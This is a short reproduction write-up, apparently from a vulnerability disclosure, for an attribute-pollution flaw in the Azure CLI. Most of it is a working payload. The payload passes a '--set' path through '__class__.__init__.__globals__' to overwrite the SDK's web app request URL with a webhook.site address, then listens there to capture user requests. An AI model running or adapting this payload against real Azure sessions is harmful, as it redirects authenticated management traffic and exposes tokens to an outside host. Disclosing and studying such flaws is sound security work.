1. Open the Azure CLI in an interactive mode.
2. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
3. Input the following payload to pollute the attributes.
```
az webapp update --ids X --set "__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations._create_or_update_initial.metadata.url=https://webhook.site/5d69807c-c2aa-4fc2-b165-78880fac827d"
```
4. Listen to the above URL to hook the user request.
